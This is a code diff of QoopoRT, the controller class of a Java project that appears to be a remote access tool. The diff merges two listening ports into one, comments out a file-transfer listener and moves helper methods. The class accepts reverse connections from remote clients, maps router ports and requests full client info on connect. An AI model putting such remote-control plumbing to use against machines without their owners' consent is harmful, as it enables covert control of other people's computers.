@@ -27,7 +27,6 @@ import network.ConexionServer;
 import qooport.Global;
 import qooport.asociado.Asociado;
 import qooport.listener.ServListener;
-import qooport.listener.TransfListener;
 import qooport.modulos.archivos.anterior.DescargaArchivo;
 import qooport.modulos.archivos.anterior.SubirArchivo;
 import qooport.utilidades.GuiUtil;
@@ -48,24 +47,63 @@ public class QoopoRT {
     public static List<SubirArchivo> listaSubidas = new ArrayList<>();
     public static List<Accion> accionesDescarga; //acciones a ejecutarse cuadno se completa una descarga de archivo, como volver a listar la carpeta actual
     public static List<Accion> accionesSubida;// acciones a ejecutarse cuadno se completa una carga de archivo
-    private final TareaMiniatura hiloMiniatura = new TareaMiniatura();
-    private ScheduledExecutorService programadorMiniatura;
     public static QoopoRT instancia;
     public static String tipoLetra = "Arial";
+    public static void iniciar() {
+        instancia = new QoopoRT();
+    }
+    public static void agregarAccionDescarga(Accion accion) {
+        if (accionesDescarga == null) {
+            accionesDescarga = new ArrayList<>();
+        }
+        accionesDescarga.add(accion);
+    }
+    public static void eliminarAccionDescarga(Accion accion) {
+        if (accionesDescarga != null) {
+            accionesDescarga.remove(accion);
+        }
+    }
+    public static void agregarAccionCarga(Accion accion) {
+        if (accionesSubida == null) {
+            accionesSubida = new ArrayList<>();
+        }
+        accionesSubida.add(accion);
+    }
+    public static void eliminarAccionCarga(Accion accion) {
+        if (accionesSubida != null) {
+            accionesSubida.remove(accion);
+        }
+    }
+    public static void ejecutarAccionesDescarga() {
+        try {
+            for (Accion accion : accionesDescarga) {
+                accion.ejecutar();
+            }
+        } catch (Exception e) {
+            
+        }
+    }
+    public static void ejecutarAccionesCarga() {
+        try {
+            for (Accion accion : accionesSubida) {
+                accion.ejecutar();
+            }
+        } catch (Exception e) {
+            
+        }
+    }
+    private final TareaMiniatura hiloMiniatura = new TareaMiniatura();
+    private ScheduledExecutorService programadorMiniatura;
     public ContadorBPS contadorSubida;
     public ContadorBPS contadorBajada;
     public ContadorBPS contadorTotalBajada;
     public ContadorBPS contadorTotalSubida;
     private List<ServListener> listaConexiones;
-    private List<TransfListener> listaConexionesarchivos;
     private ModoAvanzado ventana = null;
     private List<Perfil> perfiles;
     private Configuracion config;
     private boolean escuchando = false;
 
-    public static void iniciar() {
-        instancia = new QoopoRT();
-    }
 
     public QoopoRT() {
         iniciarComponente();
@@ -257,7 +295,6 @@ public class QoopoRT {
         }
         List<String> puertosUsados = new ArrayList<>();
         this.listaConexiones = new ArrayList<>();
-        this.listaConexionesarchivos = new ArrayList<>();
         int tipoConexion = 0;
         String tipoConexionSTR = null;
 
@@ -295,44 +332,44 @@ public class QoopoRT {
 
                 if (Boolean.valueOf((String) p.obtenerParametro("inversa"))) {
                     try {
-                        if (!puertosUsados.contains((String) p.obtenerParametro("puerto1") + "|" + tipoConexion)) {
+                        if (!puertosUsados.contains((String) p.obtenerParametro("puerto") + "|" + tipoConexion)) {
                             //redirecciono los puetos en el router
-                            new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto1")), 2).start();
+                            new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto")), 2).start();
 
                             ServListener c1 = new ServListener(
-                                    Integer.valueOf((String) p.obtenerParametro("puerto1")),
+                                    Integer.valueOf((String) p.obtenerParametro("puerto")),
                                     tipoConexion, version2, ssl
                             );
                             c1.start();
                             if (!listaConexiones.contains(c1)) {
                                 listaConexiones.add(c1);
                             }
-                            puertosUsados.add((String) p.obtenerParametro("puerto1") + "|" + tipoConexion);
-                            this.ponerEstado("Esperando conexiones en el puerto [" + (String) p.obtenerParametro("puerto1") + "]" + " (" + tipoConexionSTR + ")");
+                            puertosUsados.add((String) p.obtenerParametro("puerto") + "|" + tipoConexion);
+                            this.ponerEstado("Esperando conexiones en el puerto [" + (String) p.obtenerParametro("puerto") + "]" + " (" + tipoConexionSTR + ")");
                         }
                     } catch (IOException ex) {
                         ex.printStackTrace();
-                        this.ponerEstado("No se puede abrir el puerto [" + (String) p.obtenerParametro("puerto1") + "]" + " (" + tipoConexionSTR + ")");
+                        this.ponerEstado("No se puede abrir el puerto [" + (String) p.obtenerParametro("puerto") + "]" + " (" + tipoConexionSTR + ")");
                     }
-                    try {
-                        if (!puertosUsados.contains((String) p.obtenerParametro("puerto2") + "|" + tipoConexion)) {
-                            //redirecciono los puetos en el router
-                            new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto2")), 2).start();
-                            TransfListener c2 = new TransfListener(
-                                    Integer.valueOf((String) p.obtenerParametro("puerto2")),
-                                    tipoConexion, version2, ssl
-                            );
-                            c2.start();
-                            if (!listaConexionesarchivos.contains(c2)) {
-                                listaConexionesarchivos.add(c2);
-                            }
-                            puertosUsados.add((String) p.obtenerParametro("puerto2") + "|" + tipoConexion);
-                            this.ponerEstado("Esperando conexiones en el puerto [" + (String) p.obtenerParametro("puerto2") + "]" + " (" + tipoConexionSTR + ")");
-                        }
-                    } catch (IOException ex) {
-                        ex.printStackTrace();
-                        this.ponerEstado("No se puede abrir el puerto [" + (String) p.obtenerParametro("puerto2") + "]" + " (" + tipoConexionSTR + ")");
-                    }
+//                    try {
+//                        if (!puertosUsados.contains((String) p.obtenerParametro("puerto2") + "|" + tipoConexion)) {
+//                            //redirecciono los puetos en el router
+//                            new MapearPuertos(Integer.valueOf((String) p.obtenerParametro("puerto2")), 2).start();
+//                            TransfListener c2 = new TransfListener(
+//                                    Integer.valueOf((String) p.obtenerParametro("puerto2")),
+//                                    tipoConexion, version2, ssl
+//                            );
+//                            c2.start();
+//                            if (!listaConexionesarchivos.contains(c2)) {
+//                                listaConexionesarchivos.add(c2);
+//                            }
+//                            puertosUsados.add((String) p.obtenerParametro("puerto2") + "|" + tipoConexion);
+//                            this.ponerEstado("Esperando conexiones en el puerto [" + (String) p.obtenerParametro("puerto2") + "]" + " (" + tipoConexionSTR + ")");
+//                        }
+//                    } catch (IOException ex) {
+//                        ex.printStackTrace();
+//                        this.ponerEstado("No se puede abrir el puerto [" + (String) p.obtenerParametro("puerto2") + "]" + " (" + tipoConexionSTR + ")");
+//                    }
                 } else {
                     System.out.println("directa");
                 }
@@ -369,11 +406,11 @@ public class QoopoRT {
         for (ServListener c : this.listaConexiones) {
             c.stopPara();
         }
-        for (TransfListener c : this.listaConexionesarchivos) {
-            c.stopPara();
-        }
+//        for (TransfListener c : this.listaConexionesarchivos) {
+//            c.stopPara();
+//        }
         this.listaConexiones = new ArrayList<>();
-        this.listaConexionesarchivos = new ArrayList<>();
+//        this.listaConexionesarchivos = new ArrayList<>();
         escuchando = false;
         try {
             ventana.getBtnIniciar().setText("Iniciar");
@@ -505,8 +542,7 @@ public class QoopoRT {
                 Notificaciones.mostrarNotificacion(serv);
                 Notificaciones.sondidoConectar();
             }
-            
-            
+
             serv.enviarComando(Protocolo.GET_INFO_COMPLETA);//pido la info completa para almacenarla en el directorio
         } catch (Exception e) {
             e.printStackTrace();
@@ -607,8 +643,7 @@ public class QoopoRT {
                         new Object[]{
                             null,
                             (String) p.obtenerParametro("nombre"),
-                            (String) p.obtenerParametro("puerto1"),
-                            (String) p.obtenerParametro("puerto2"),
+                            (String) p.obtenerParametro("puerto"),
                             tipoConexion,
                             version2,
                             ssl
@@ -718,50 +753,4 @@ public class QoopoRT {
         }
     }
     // </editor-fold>
-
-    public static void agregarAccionDescarga(Accion accion) {
-        if (accionesDescarga == null) {
-            accionesDescarga = new ArrayList<>();
-        }
-        accionesDescarga.add(accion);
-    }
-
-    public static void eliminarAccionDescarga(Accion accion) {
-        if (accionesDescarga != null) {
-            accionesDescarga.remove(accion);
-        }
-    }
-
-    public static void agregarAccionCarga(Accion accion) {
-        if (accionesSubida == null) {
-            accionesSubida = new ArrayList<>();
-        }
-        accionesSubida.add(accion);
-    }
-
-    public static void eliminarAccionCarga(Accion accion) {
-        if (accionesSubida != null) {
-            accionesSubida.remove(accion);
-        }
-    }
-
-    public static void ejecutarAccionesDescarga() {
-        try {
-            for (Accion accion : accionesDescarga) {
-                accion.ejecutar();
-            }
-        } catch (Exception e) {
-
-        }
-    }
-
-    public static void ejecutarAccionesCarga() {
-        try {
-            for (Accion accion : accionesSubida) {
-                accion.ejecutar();
-            }
-        } catch (Exception e) {
-
-        }
-    }
 }
